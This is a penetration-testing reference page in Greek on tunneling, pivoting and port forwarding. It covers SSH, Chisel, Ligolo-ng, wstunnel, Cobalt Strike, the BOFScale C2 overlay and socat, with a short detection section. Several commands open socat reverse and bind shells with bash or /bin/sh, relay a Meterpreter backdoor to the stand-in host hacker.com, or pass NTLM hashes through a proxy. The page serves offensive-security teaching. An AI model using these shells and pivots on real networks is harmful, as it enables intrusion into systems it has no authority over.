# Tunneling και Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Συμβουλή για το Nmap

> [!WARNING]
> Η υποστήριξη proxy του Nmap περιορίζεται σε συνδέσεις TCP και δεν επηρεάζει τις σαρώσεις ping, θυρών ή ανίχνευσης OS. Όταν ο scanner βρίσκεται πίσω από SOCKS proxy, **απενεργοποιήστε την ανακάλυψη host** (`-Pn`) και χρησιμοποιήστε **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Η τελική εντολή χρησιμοποιεί τις επιλογές `-u` και `-i` του Evil-WinRM για να προσδιορίσει τον λογαριασμό και το WinRM host· η προεπιλεγμένη θύρα WinRM είναι η 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

Το OpenSSH μπορεί να προωθεί συνδέσεις X11, αυθαίρετες θύρες TCP και Unix-domain sockets μέσω του κρυπτογραφημένου καναλιού του.<sup>[[6]](#references)</sup>

Γραφική σύνδεση SSH (X)

Το `-Y` ενεργοποιεί την προώθηση αξιόπιστου X11 και το `-C` ζητά συμπίεση των προωθούμενων δεδομένων.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Άνοιγμα νέας θύρας στον SSH Server --> Άλλη θύρα

Η προώθηση Remote (`-R`) ακούει στον SSH server και συνδέεται στην τοπική πλευρά· η ρητή διεύθυνση bind καθορίζει από ποιες διεπαφές μπορεί να γίνει σύνδεση σε αυτόν τον listener.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Τοπική θύρα --> Παραβιασμένος host (SSH) --> Third_box:Port

Το Local (`-L`) forwarding ακούει στον client και συνδέεται στον προορισμό από την πλευρά του SSH server.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Οπουδήποτε

Η δυναμική προώθηση (`-D`) δημιουργεί έναν τοπικό listener SOCKS4/SOCKS5, οι συνδέσεις του οποίου ανοίγονται από την απομακρυσμένη πλευρά.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop with ProxyJump

Το `-J`/`ProxyJump` συνδέεται στον στόχο μέσω ενός ή περισσότερων jump hosts, χωρισμένων με κόμμα. Οι επιλογές forwarding εξακολουθούν να αφορούν την τελική σύνδεση SSH, επομένως ο παρακάτω SOCKS listener ανοίγει προορισμούς από το `internal-target` και όχι από το πρώτο bastion. Έτσι αποφεύγεται η σύνδεση σε jump host και η εκκίνηση ενός δεύτερου SSH client εκεί.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Οι επιλογές που αφορούν συγκεκριμένους hosts για jump machines πρέπει να τοποθετούνται στο `~/.ssh/config`· οι ρυθμίσεις της γραμμής εντολών που προορίζονται για τον προορισμό δεν εφαρμόζονται αυτόματα στους ενδιάμεσους hosts.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Αυτό είναι χρήσιμο για να λαμβάνετε reverse shells από εσωτερικούς hosts μέσω ενός DMZ στον host σας:

Η ρύθμιση `GatewayPorts` του server ελέγχει αν μια απομακρυσμένη προώθηση μπορεί να δεσμεύσει διευθύνσεις πέρα από το loopback· η προεπιλεγμένη τιμή της είναι `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### Σήραγγα VPN

Αυτό το παράδειγμα που βασίζεται σε root δημιουργεί συσκευές tunnel και στους δύο host. Ο server πρέπει να επιτρέπει την προώθηση tun και ο επιλεγμένος λογαριασμός πρέπει να έχει πρόσβαση στη συσκευή tun· το `PermitRootLogin yes` είναι ένας τρόπος να χρησιμοποιηθεί εδώ ο λογαριασμός `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Ενεργοποίηση της προώθησης στην πλευρά του Server

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Ορίστε μια νέα διαδρομή στην πλευρά του client.

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Ασφάλεια – Terrapin Attack (CVE-2023-48795)**  
> Το OpenSSH 9.6 πρόσθεσε μια επέκταση strict-KEX για να αντιμετωπίσει την επίθεση ακεραιότητας Terrapin στο αρχικό στάδιο της μεταφοράς. Ενημερώστε και τα δύο άκρα, όπου είναι δυνατό, και ακολουθήστε τις οδηγίες των προμηθευτών για παλαιότερες υλοποιήσεις, αντί να υποθέτετε ότι ένα προωθημένο κανάλι προστατεύεται μόνο και μόνο λόγω της έκδοσης.<sup>[[8]](#references)</sup>

## SSHUTTLE

Μπορείτε να κάνετε **tunnel** μέσω **ssh** για όλο το **traffic** προς ένα **υποδίκτυο** μέσω ενός host.\
Για παράδειγμα, για προώθηση όλου του traffic που κατευθύνεται στο 10.10.10.0/24

Το `sshuttle` παρέχει διαφανή διαμεσολάβηση μέσω SSH και υποστηρίζει την επιλογή υποδικτύων και μιας προσαρμοσμένης εντολής SSH, όπως φαίνεται παρακάτω.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Σύνδεση με ιδιωτικό κλειδί

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Το `portfwd` του Metasploit υποστηρίζει τοπική και απομακρυσμένη προώθηση, ενώ το SOCKS proxy module του προορίζεται για χρήση με session routes ή `autoroute` και, σε αυτά τα παραδείγματα, ακούει από προεπιλογή στη θύρα 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Τοπική θύρα --> Παραβιασμένος host (ενεργή συνεδρία) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Ένας άλλος τρόπος:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Το Beacon του Cobalt Strike μπορεί να προωθεί συνδέσεις SOCKS4a/SOCKS5 μέσω ενός Beacon· το `rportfwd` κάνει bind στον παραβιασμένο host, ενώ το `rportfwd_local` ξεκινά τη σύνδεση με τον προορισμό από το Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Ανοίξτε μια θύρα στον Team Server, στις διεπαφές μέσω των οποίων θέλετε να δρομολογείται η κίνηση μέσω του Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον host του Beacon**, όχι στον Team Server, και η κίνηση αποστέλλεται στον Team Server και από εκεί στον καθορισμένο host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Το εγχειρίδιο reverse forwarding σημειώνει την εξής συμπεριφορά:<sup>[[14]](#references)</sup>

- Το reverse port forward του Beacon έχει σχεδιαστεί για **tunnel της κίνησης προς τον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
- Η κίνηση **διοχετεύεται μέσω της κίνησης C2 του Beacon**, συμπεριλαμβανομένων των συνδέσμων P2P.
- Οι υψηλές θύρες συνήθως αποφεύγουν τους περιορισμούς στις privileged θύρες, αλλά εξακολουθούν να ισχύουν οι πολιτικές του λειτουργικού συστήματος-στόχου και οι υπάρχοντες listeners.

### rPort2Port local

> [!WARNING]
> Σε αυτήν την περίπτωση, η **θύρα ανοίγει στον host του Beacon**, όχι στον Team Server, και η **κίνηση αποστέλλεται στον client του Cobalt Strike** (όχι στον Team Server) και από εκεί στον υποδεικνυόμενο host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: προώθηση TCP σε userspace χωρίς λογαριασμό

Το Tailcat χρησιμοποιεί το WireGuard/NAT-traversal/DERP data plane του Tailscale χωρίς το control plane του Tailscale. Δεν χρειάζεται λογαριασμό Tailscale ή δικαιώματα διαχειριστή, ενώ δεν εγκαθιστά host routes ούτε αλλάζει το DNS. Σε αντίθεση με τα [Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve) ή το in-process [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet), ο server κοινοποιεί τη *διεύθυνση Tailcat* εκτός ζώνης. Ο client χρησιμοποιεί αυτήν τη διεύθυνση για να συνδεθεί σε μια θύρα που εξυπηρετεί ο απομακρυσμένος κόμβος.<sup>[[62]](#references)</sup>

Για μια υπηρεσία TCP που ήδη ακούει στη θύρα `4444` του απομακρυσμένου κόμβου, εκκινήστε εκεί το `serve` και δώστε τη διεύθυνση που εμφανίζει στο `forward` του client. Η δεύτερη εντολή δεσμεύει από προεπιλογή τη διεύθυνση `127.0.0.1:18080`, επομένως μια τοπική διεργασία που υποστηρίζει μόνο κανονικές υποδοχές TCP μπορεί να συνδεθεί σε αυτήν τη θύρα loopback, ενώ το Tailcat μεταφέρει την κίνησή της στην απομακρυσμένη θύρα `4444`.<sup>[[62]](#references)</sup> Οι αριθμοί των θυρών δεν είναι ειδικοί για το Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Η διεύθυνση περιέχει το δημόσιο κλειδί WireGuard του server και, από προεπιλογή στις τρέχουσες εκδόσεις, ένα pre-shared key. Αντιμετωπίστε την ως διαπιστευτήριο: ένας server χωρίς περιορισμούς αποδέχεται έναν peer που γνωρίζει τη διεύθυνση. Μια προσωρινή διεύθυνση παύει να λειτουργεί όταν τερματιστεί ο server. Ένα αποθηκευμένο κλειδί `default` κάνει το `serve` να επαναχρησιμοποιεί μια σταθερή διεύθυνση σε επόμενες εκτελέσεις, γι’ αυτό ελέγξτε το μήνυμα εκκίνησης και περιορίστε τους clients με `serve --allow` αν υπάρχει πιθανότητα να εκτεθεί η διεύθυνση.<sup>[[62]](#references)</sup>

Οι συνδέσεις μπορούν να χρησιμοποιήσουν απευθείας διαδρομή UDP ή αναμετάδοση DERP. Έτσι αποφεύγεται η ανάγκη για αποκλειστικό C2 domain, αλλά η δραστηριότητα στο δίκτυο δεν εξαφανίζεται.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet εντός διεργασίας με διαμεσολάβηση CDN

Το [BOFScale](https://github.com/NetSPI/BOFscale) εκτελεί ένα τροποποιημένο overlay Tailscale μέσα σε ένα Windows C2 implant, χωρίς να εγκαθιστά TUN driver ή service. Τα τρία συστατικά του είναι ένα ασύγχρονο CGo `c-shared` `tailscaled` BOF-PE, ένα μικρό C++ BOF-PE που επικοινωνεί με το τοπικό API και μια ασύγχρονη γέφυρα `socksportfwd` από TCP σε SOCKS5.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 και DERP συμβατά με CDN

Το Tailscale χρησιμοποιεί συνήθως ιδιόκτητες αναβαθμίσεις HTTP για το κανάλι ελέγχου TS2021 που βασίζεται στο Noise και για την αναμετάδοση DERP. Το BOFScale διατηρεί αυτές τις ροές byte, αλλά τις μεταφέρει μέσω WebSockets RFC 6455, χρησιμοποιώντας `Sec-WebSocket-Protocol: ts2021` ή `derp`, ώστε μια origin Headscale/DERP που ελέγχεται από τον operator να μπορεί να βρίσκεται πίσω από CDN που δέχεται μόνο τυπικές αναβαθμίσεις WebSocket. Ο τροποποιημένος client επαναλαμβάνει την προσπάθεια TS2021 μέσω WebSockets μετά από HTTP `500`, επαναλαμβάνει την προσπάθεια DERP μετά από HTTP `426` και κάνει τον dialer DERP WebSocket να λαμβάνει υπόψη τη ρύθμιση proxy του host· το BOF ορίζει το `TS_DEBUG_DERP_WS_CLIENT=1` για να παραλείψει την πρώτη, γνωστό ότι αποτυγχάνει, προσπάθεια.<sup>[[53]](#references)[[54]](#references)</sup>

Το CDN και το origin proxy πρέπει να διατηρούν τις αναβαθμίσεις WebSocket για τα `/ts2021` και `/derp`, να προωθούν το `/key` ως συνηθισμένο HTTP και να απενεργοποιούν τα εσωτερικά read/write timeouts, επειδή οι συνεδρίες αναμετάδοσης μπορούν να παραμένουν ανοιχτές επ’ αόριστον. Η παρεχόμενη ρύθμιση Headscale ενεργοποιεί το `verify_clients`, δημοσιεύει μόνο τον ενσωματωμένο χάρτη DERP του operator και αφήνει το `derp.urls` κενό, ώστε να αποτρέπεται η εφεδρική χρήση αναμεταδοτών που διαχειρίζεται το Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon εντός διεργασίας και έλεγχος μέσω named pipe

Αν δεν γίνει override, το σημείο εισόδου του BOF εκκινεί το `tailscaled` με `-tun=userspace-networking`, `-state mem:` και `-no-logs-no-support` και, στη συνέχεια, δημιουργεί ένα pipe με όνομα UUID. Ανακατευθύνει τα stdout/stderr του Go μέσω ενός OS pipe στο Beacon output API, έτσι ώστε ολόκληρο το daemon και το Go runtime να παραμένουν στη μνήμη, χωρίς όμως η κατάσταση ή τα logs να εγγράφονται σε κατάλογο του Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Ο ελαφρύς client αναπαράγει το τοπικό API HTTP/1.0 του Tailscale μέσω αυτού του pipe. Ανοίγει το pipe με `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, επειδή το επίπεδο `safesocket` του daemon κάνει impersonation του client του pipe, στέλνει `Tailscale-Cap: 125` και αντιστοιχίζει το τοπικό API στις λειτουργίες `up`, `down`, `status`, διαφήμισης διαδρομών και τερματισμού.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Μην αποφορτώνετε ένα Go BOF-PE που έχει γίνει manual mapping αφού ζητήσετε από το daemon να τερματιστεί: goroutines του runtime και του garbage collector ενδέχεται να συνεχίσουν να εκτελούνται από μνήμη που ο loader αποδεσμεύει. Εκτελέστε το `tailscaled` σε αναλώσιμη διεργασία και τερματίστε αυτή τη διεργασία για τον τελικό καθαρισμό.<sup>[[54]](#references)</sup>

### Προώθηση κίνησης από το host μέσω userspace SOCKS5

Οι εισερχόμενες συνδέσεις tailnet και οι διαφημιζόμενες subnet routes λειτουργούν μέσα στη userspace network stack, αλλά οι κανονικές διεργασίες στο παραβιασμένο host δεν έχουν OS route προς το overlay. Γι’ αυτό το `socksportfwd` ακούει σε μια TCP port προσβάσιμη από το θύμα, διαπραγματεύεται SOCKS5 `NO AUTH` με τον listener `0.0.0.0:1080` του daemon, στέλνει `CONNECT` για έναν προορισμό του tailnet και προωθεί ασύγχρονα την κίνηση και προς τις δύο κατευθύνσεις. Αν ο στόχος είναι όνομα MagicDNS, χρησιμοποιεί `ATYP_DOMAIN`, ώστε το `tailscaled` να επιλύσει το όνομα χωρίς να το εκθέσει στον Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Παρακάτω παρουσιάζεται μια ελάχιστη ροή εργασίας για τον operator· τόσο ο κόμβος του operator όσο και το implant πρέπει να χρησιμοποιούν τα τροποποιημένα binaries, καθώς το τυπικό Tailscale δεν μπορεί να λειτουργήσει μέσω αυτού του σχεδιασμού CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Το local forward μπορεί να διαχωρίσει τον φαινομενικό authentication listener από το relay tool: εξαναγκάστε ένα μηχάνημα να πραγματοποιήσει authentication στη bound port του compromised host, προωθήστε το μέσω του tailnet στο `ntlmrelayx` και κάντε relay προς AD CS, LDAP, HTTP, SMB ή άλλο συμβατό target. Για τα στάδια που αφορούν συγκεκριμένες ευπάθειες, δείτε το [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) και το [ESC8 relay προς AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)· το BOFScale είναι μόνο το transport.<sup>[[54]](#references)</sup>

### Ανίχνευση

Αναζητήστε τον συνδυασμό, όχι έναν μεμονωμένο αδύναμο δείκτη: Go runtime σε διεργασία που συνήθως δεν βασίζεται σε Go, UUID pipe με permissive SDDL `D:(A;;GA;;;WD)`, μη αναμενόμενο SOCKS listener `0.0.0.0:1080` και μακρόβια TLS WebSockets προς διευθύνσεις CDN. Με TLS inspection, επισημάνετε το `Sec-WebSocket-Protocol: derp` ή `ts2021` όταν η διεργασία που το χρησιμοποιεί δεν είναι εξουσιοδοτημένη υπηρεσία `tailscaled`. Οι κανόνες `bofscale.yar` του repository παρέχουν memory signatures και για τα τρία στοιχεία BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Το project παρέχει web tunnel endpoints όπως τα `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` και `tunnel.php`· ανεβάστε ένα υποστηριζόμενο endpoint πριν εκκινήσετε το local proxy.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα releases του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Το Chisel μεταφέρει κίνηση TCP/UDP μέσω HTTP χρησιμοποιώντας σύνδεση προστατευμένη με SSH· χρησιμοποιήστε συμβατά builds client/server και επαληθεύστε τη σύνταξη εντολών της επιλεγμένης έκδοσης.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Προώθηση θυρών

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

Το [`wstunnel`](https://github.com/erebe/wstunnel) μεταφέρει στατικές ή δυναμικές προωθήσεις μέσω WebSocket, HTTP/2 ή WebTransport (HTTP/3 μέσω QUIC). Οι τρέχουσες εκδόσεις υποστηρίζουν TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying και Linux transparent-proxy listeners, τόσο σε forward όσο και σε reverse mode.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Εκτελέστε τον server στον attacker και ρυθμίστε το pivot να συνδεθεί εξερχόμενα με `-R`. Σε αυτή την κατεύθυνση, ο SOCKS5 listener δημιουργείται στον **server**, ενώ οι ζητούμενες συνδέσεις ξεκινούν από το δίκτυο του **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Ένα reverse static forward χρησιμοποιεί την ίδια κατεύθυνση. Για παράδειγμα, το παρακάτω εκθέτει το `10.10.10.20:445`, όπως είναι προσβάσιμο μέσω του pivot, στη loopback θύρα `8445` του επιτιθέμενου:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Λεπτομέρειες εξερχόμενης κίνησης και μεταφοράς

- Προσθέστε `-p http://user:pass@proxy:8080` στον client για να περάσετε μέσω ενός explicit HTTP proxy. Χρησιμοποιήστε `socks5h://127.0.0.1:1080` σε clients όπως το `curl` (ή ενεργοποιήστε proxied DNS στην εφαρμογή), ώστε τα εσωτερικά ονόματα να επιλύονται πέρα από το tunnel και να μη γίνεται leak στον τοπικό resolver.<sup>[[52]](#references)</sup>
- Το `wss://` επιλέγει WebSocket με προστασία TLS. Ένας client `https://` επιλέγει HTTP/2, αλλά το buffering ή η μετατροπή σε HTTP/1 από reverse proxies/CDNs συνήθως διακόπτει το bidirectional stream· κατά τη δοκιμή αυτής της λειτουργίας, εκθέστε απευθείας τον server του wstunnel.<sup>[[52]](#references)</sup>
- Το `wts://` επιλέγει WebTransport μέσω QUIC. Εκκινήστε τον server με `--enable-webtransport` (ή με URL listen `wts://`) και επιτρέψτε UDP στη θύρα ακρόασης. Αυτή η λειτουργία δεν μπορεί να περάσει μέσω ενός συμβατικού HTTP `CONNECT` proxy, επειδή εκείνος μεταφέρει TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Το upstream project προειδοποιεί να μη θεωρείτε το ενσωματωμένο self-signed certificate προστασία απορρήτου. Προτιμήστε ένα έγκυρο custom certificate μαζί με `--tls-verify-certificate` (ή mTLS), διατηρήστε τους proxy listeners σε loopback εκτός αν η απομακρυσμένη πρόσβαση είναι σκόπιμη και χρησιμοποιήστε tunnel για ήδη ασφαλή protocols όταν απαιτείται εμπιστευτικότητα.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Το quickstart του Ligolo-ng περιγράφει ένα TUN interface στον proxy, επικύρωση του certificate fingerprint για τον agent και ρύθμιση route για το tunneled δίκτυο.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Δέσμευση και ακρόαση Agent

Το Ligolo-ng μπορεί να προσθέσει listeners στον agent, οι οποίοι προωθούν την κίνηση σε μια διεύθυνση στην πλευρά του proxy, ενώ το δεσμευμένο εύρος `240.0.0.0/4` μπορεί να δρομολογηθεί ώστε να είναι προσβάσιμες υπηρεσίες τοπικές στον agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Πρόσβαση στις τοπικές θύρες του Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Το Rpivot ξεκινά το reverse tunnel από το θύμα και εκθέτει έναν SOCKS4 proxy στη διεύθυνση loopback του επιτιθέμενου· το README του περιγράφει επίσης διαπιστευτήρια NTLM-proxy και επιλογές hash.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot μέσω **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Το Socat συνδυάζει τύπους διευθύνσεων όπως `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` και `PROXY`· τα παρακάτω παραδείγματα συνδυάζουν αυτά τα τεκμηριωμένα endpoints.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port μέσω socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter μέσω SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Μπορείτε να περάσετε μέσα από έναν **proxy χωρίς έλεγχο ταυτότητας** με τον τεκμηριωμένο τύπο διεύθυνσης `PROXY` του socat, εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Σήραγγα SSL Socat

**Κονσόλα /bin/sh**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: client και server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

